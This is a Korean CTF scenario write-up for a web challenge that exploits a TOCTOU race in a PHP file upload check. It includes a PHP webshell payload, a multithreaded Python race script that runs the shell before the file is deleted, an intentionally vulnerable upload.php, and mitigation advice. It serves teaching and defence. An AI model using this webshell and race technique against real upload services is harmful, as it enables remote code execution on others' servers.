---
title: TOCTOU File Upload Race Condition — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, race-condition, toctou, file-upload, concurrency]
confidence: high
---

# TOCTOU File Upload Race Condition — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Code Validator (코드 정적 분석기)
- **난이도**: Medium-High
- **핵심 컨셉**: 웹 서버의 파일 업로드 처리 단계 중 **검증 시점과 사용 시점의 차이(TOCTOU - Time-of-Check to Time-of-Use)**로 인해 발생하는 **경쟁 조건(Race Condition)** 취약점 문제입니다. 서버는 업로드된 파일이 안전한지 검증하기 위해 파일을 임시 디렉터리에 먼저 쓴(Save) 뒤, 헬퍼 분석 모듈을 돌려 검사(Check)하고, 악성 코드가 발견되면 파일을 즉시 삭제(Delete)합니다. 공격자는 파일이 생성된 후 백업/검증 및 삭제가 일어나기 전의 아주 미세한 지연 시간(밀리초 단위) 사이에 다중 스레드로 임시 파일 경로를 지속적으로 요청(Request Loop)하여, 파일이 지워지기 전에 웹셸 코드를 강제 가동시킵니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Frontend / Portal**: 검사할 소스 코드(.zip 또는 단일 스크립트)를 업로드하는 화면.
- **Backend Service (Apache + PHP)**:
  - 파일 수신 즉시 `/uploads/temp_<ip>/<filename>` 경로에 파일 쓰기 수행.
  - 보안 로직: 소스 파일 내 위험한 함수(예: `eval`, `system`, `shell_exec`, `passthru`)가 감지되는지 Regex 스캔 수행.
  - 스캔 중 보안 위협 감지 시 해당 임시 파일 삭제(`unlink()`).
  - 단, 파일 쓰기 완료 시점부터 파일 정적 분석 및 `unlink` 실행이 완전히 완료되기까지 미세한 CPU 스케줄러 지연(약 50ms~100ms)이 발생함.
- **Flag 위치**: 
  - 서버 로컬 시스템: `/flag.txt`

### 2.2 취약점 지점
1. **Unsafe Temp File Storage Pattern (TOCTOU)**:
   - 메모리 버퍼 상에서 사전 검증을 완료한 뒤 파일 시스템에 정식 저장하는 것이 아닌, 파일 시스템에 임시 파일을 먼저 실체화한 뒤 사후 검증하는 아키텍처적 로직 설계 오류입니다.
   - 비동기 웹 환경이나 멀티 스레드 기반 웹서버(Apache mpm_prefork 등) 환경에서 임시 경로로 직접 HTTP 요청 접근이 가용하여 발생합니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 / 경로 | 메소드 | 인증 | 입력 값 | 반환 값 | 비고 |
|-------------------|--------|------|---------|---------|------|
| `/upload.php` | POST | 없음 | `file` 멀티파트 객체 | 업로드 처리 결과 페이지 | 임시 파일이 작성되는 공격 유발 경로 |
| `/uploads/temp_*/<file>`| GET | 없음 | 없음 | 해당 파일 스크립트 실행 결과 | 지워지기 전에 강제 요청할 웹셸 주소 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. 파일 검사 동작 분석
임의의 웹셸 코드(`<?php system($_GET['cmd']); ?>`)를 업로드해 봅니다.
- *결과*: "Threat detected! File deleted." 메세지 수신.
- *동작 분석*: 파일이 업로드가 거절되지만, 서버가 임시 폴더에 원본 파일명을 이용해 임시 저장을 한 뒤 검사해 지운다는 메커니즘을 소스 검토나 추정으로 확인합니다. (저장 위치: `/uploads/temp_user/shell.php`)

### Step 2. 무한 루프 다중 스레드 스크립트 구성
공격자는 파일이 업로드된 뒤 지워지기 전 찰나의 타이밍을 잡기 위해 두 개의 병렬 스레드 스루풋을 만드는 스크립트를 작성합니다.
1. **스레드 A (Uploader)**: 악성 PHP 웹셸(`shell.php`)을 끊임없이 반복적으로 서버에 업로드 요청을 날립니다.
2. **스레드 B (Trigger)**: 업로드 대상 파일 경로인 `/uploads/temp_user/shell.php?cmd=cat /flag.txt`를 엄청난 속도로 연속 GET 요청합니다.

- **Exploit Script (Python Concurrency)**:
  ```python
  import requests
  import threading

  target_upload = "http://validator.local/upload.php"
  target_shell = "http://validator.local/uploads/temp_user/shell.php"
  
  # 공격 중단 플래그
  stop_event = threading.Event()

  def upload_loop():
      # 웹셸을 계속 업로드 시도
      files = {'file': ('shell.php', '<?php system("cat /flag.txt"); ?>')}
      while not stop_event.is_set():
          requests.post(target_upload, files=files)

  def trigger_loop():
      # 생성되어 지워지기 전에 낚아채서 실행시킴
      while not stop_event.is_set():
          r = requests.get(target_shell)
          if r.status_code == 200 and "FLAG" in r.text:
              print(f"[+] Race Won! Result: {r.text}")
              stop_event.set()
              break

  # 각각 10개씩의 스레드 기동
  for _ in range(10):
      threading.Thread(target=upload_loop).start()
      threading.Thread(target=trigger_loop).start()
  ```

### Step 3. 경쟁 상태 유발 및 트리거 적중
1. 스크립트를 구동하면 다수의 업로드 요청과 실행 요청이 동시에 데이터 흐름(Race)을 형성합니다.
2. 특정 순간, **업로드 쓰기 성공 -> (정적 분석 스캔 지연 중) -> 스레드 B의 GET 요청 도달 -> 웹셸 파싱 완료 및 쉘 실행 출력 -> 정적 분석가에 의해 삭제** 시퀀스가 물리적으로 성립(Race Win)합니다.

### Step 4. flag 획득
스레드 B의 HTTP 200 OK 응답 버퍼에 성공적으로 담겨 반환된 플래그(`FLAG{toctou_temp_file_race_condition}`)를 수집합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (PHP)

```php
// upload.php (취약한 사후 검사 로직 예시)
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $file_name = $_FILES['file']['name'];
    $file_tmp = $_FILES['file']['tmp_name'];
    
    // 임시 업로드 디렉터리 경로
    // 사용자의 고정 IP나 고정 세션 폴더를 쓴다면 파일 경로 예측이 완벽히 가능해짐
    $temp_dir = "uploads/temp_user/";
    if (!file_exists($temp_dir)) {
        mkdir($temp_dir, 0755, true);
    }
    
    $target_file = $temp_dir . basename($file_name);
    
    // 취약점 지점 (TOCTOU): 검사 전에 파일 시스템에 먼저 쓰기를 완료함!
    if (move_uploaded_file($file_tmp, $target_file)) {
        
        // 정적 스캔 작업 수행 지연 (CPU 렌더링 부하 유발 및 분석 모듈 지연 시뮬레이션)
        usleep(50000); // 50ms 지연 발생
        
        $content = file_get_contents($target_file);
        
        // 위험한 명령어 함수 정적 필터링
        if (preg_match('/(system|eval|exec|shell_exec|passthru)/i', $content)) {
            // 위협 감지 시 삭제
            unlink($target_file);
            die("Threat detected! File deleted.");
        }
        
        echo "File check complete. Safe to store.";
    }
}
?>
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **메모리 검증 후 파일 저장 (Memory Validation)**:
   - 파일을 물리 저장소에 먼저 쓰지 마십시오. 임시 파일 스트림(`php://input` 또는 `$file_tmp` 임시 시스템 임포트 경로) 상에서 정적 텍스트 데이터를 메모리로 직접 로드해 보안 검증을 수행하고, 안전한 것으로 확정된 경우에만 정식 타겟 경로에 파일을 최초 생성 및 기록합니다.
2. **웹 비활성 경로 보관 및 무작위 파일명 할당**:
   - 검증 대기 중인 임시 파일은 외부 웹 브라우저 주소(`http://...`)를 통해 직접 접근할 수 없는 웹 루트 바깥의 격리 디렉터리(`/tmp/` 등)에 저장하고, 무작위 해시 문자열 파일명을 부여해 임의 조회를 방해합니다.
3. **업로드 폴더 실행 거부 설정**:
   - `uploads` 디렉터리에 대해 스크립트 실행(PHP 실행기 활성화 등)을 차단하여, 설령 찰나의 타이밍에 파일이 존재하더라도 브라우저 접근 시 스크립트로 동작하지 않고 일반 텍스트나 바이너리로만 덤프되도록 웹 구성을 보완합니다.
 Mayan
